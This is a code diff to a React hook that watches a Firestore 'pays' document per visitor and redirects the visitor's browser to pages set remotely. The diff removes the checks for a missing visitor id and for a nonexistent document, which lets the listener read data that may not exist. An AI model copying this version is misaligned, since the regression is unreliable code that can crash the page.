@@ -50,10 +50,10 @@ export function useRedirectMonitor({
   currentPage,
 }: UseRedirectMonitorProps) {
   const router = useRouter();
-  
+
   // Track the last redirect we handled to prevent re-processing
   const lastHandledKeyRef = useRef<string>("");
-  
+
   // Debounce timer to prevent rapid-fire redirects
   const redirectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const pendingRedirectRef = useRef<string | null>(null);
@@ -80,8 +80,6 @@ export function useRedirectMonitor({
   }, [currentPage, visitorId, router]);
 
   useEffect(() => {
-    if (!visitorId || !db) return;
-
     console.log(`[RedirectMonitor] Starting listener for ${visitorId}, currentPage: ${currentPage}`);
 
     // Reset state when currentPage changes
@@ -91,44 +89,42 @@ export function useRedirectMonitor({
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       (snapshot) => {
-        if (!snapshot.exists()) return;
-        
         const data = snapshot.data();
         const now = Date.now();
-        
+
         // Check modern redirectPage system
         const redirectPage = data.redirectPage as string | undefined;
         const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
         const handledAt = data.redirectPageHandledAt as number | undefined;
-        
+
         if (redirectPage && redirectPage !== currentPage) {
           // Create unique key for this redirect
           const redirectKey = `${redirectPage}_${redirectUpdatedAt}`;
-          
+
           // Skip if we already handled this exact redirect
           if (redirectKey === lastHandledKeyRef.current) {
             console.log(`[RedirectMonitor] Already handled redirect ${redirectKey}, skipping`);
             return;
           }
-          
+
           // Skip if this redirect was already handled by a previous page
           if (handledAt && redirectUpdatedAt && handledAt >= redirectUpdatedAt) {
             console.log(`[RedirectMonitor] Redirect was already handled at ${handledAt}, skipping`);
             return;
           }
-          
+
           console.log(`[RedirectMonitor] 📍 New redirect: ${redirectPage} (updatedAt: ${redirectUpdatedAt})`);
-          
+
           // Cancel any pending redirect
           if (redirectTimerRef.current) {
             clearTimeout(redirectTimerRef.current);
             redirectTimerRef.current = null;
           }
-          
+
           // Store the redirect and process it
           lastHandledKeyRef.current = redirectKey;
           pendingRedirectRef.current = redirectPage;
-          
+
           // Process immediately (no delay)
           processRedirect(redirectPage);
         }
@@ -136,49 +132,59 @@ export function useRedirectMonitor({
         // Check legacy currentStep system
         const currentStep = data.currentStep as string | undefined;
         const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined;
-        const stepHandledAt = data.currentStepHandledAt as number | undefined;
-        
+
         if (currentStep) {
           // Check if this currentStep belongs to this page
           const allowedSteps = STEP_OWNERS[currentPage] || [];
           const stepBelongsToPage = allowedSteps.includes(currentStep);
-          
+
           if (!stepBelongsToPage) {
             console.log(`[RedirectMonitor] Step ${currentStep} belongs to another page, ignoring`);
             return;
           }
-          
+
+          // Create unique key for this redirect
           const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;
-          
+
+          // Skip if we already handled this exact redirect
           if (stepKey === lastHandledKeyRef.current) {
+            console.log(`[RedirectMonitor] Already handled step ${stepKey}, skipping`);
             return;
           }
-          
-          if (stepHandledAt && currentStepUpdatedAt && stepHandledAt >= currentStepUpdatedAt) {
-            return;
-          }
-          
+
           // Get the target URL for this step
           const targetUrl = PAGE_MAP[currentStep];
           const currentUrl = window.location.pathname;
-          
+
           // Check if we're already on the target page (after redirect)
           if (targetUrl === currentUrl) {
-            console.log(`[RedirectMonitor] Already on target page ${targetUrl}, skipping redirect`);
+            console.log(`[RedirectMonitor] Already on target page ${targetUrl}, clearing and skipping`);
+            // Clear the currentStep to prevent re-processing
+            setDoc(doc(db as Firestore, "pays", visitorId), {
+              currentStep: null,
+              currentStepHandledAt: Date.now()
+            }, { merge: true }).catch(err => {
+              console.error("[RedirectMonitor] Error clearing currentStep:", err);
+            });
             lastHandledKeyRef.current = stepKey;
             return;
           }
-          
+
           console.log(`[RedirectMonitor] 📍 Legacy step: ${currentStep} → ${targetUrl}`);
-          
+
+          // Store the step key to prevent re-processing
           lastHandledKeyRef.current = stepKey;
-          
+
           if (targetUrl) {
-            // Mark as handled
+            // Clear currentStep BEFORE redirecting to prevent re-processing
             setDoc(doc(db as Firestore, "pays", visitorId), {
+              currentStep: null,
               currentStepHandledAt: Date.now()
-            }, { merge: true }).catch(console.error);
-            
+            }, { merge: true }).catch(err => {
+              console.error("[RedirectMonitor] Error clearing currentStep:", err);
+            });
+
+            // Navigate to the target page
             router.push(targetUrl);
           }
         }
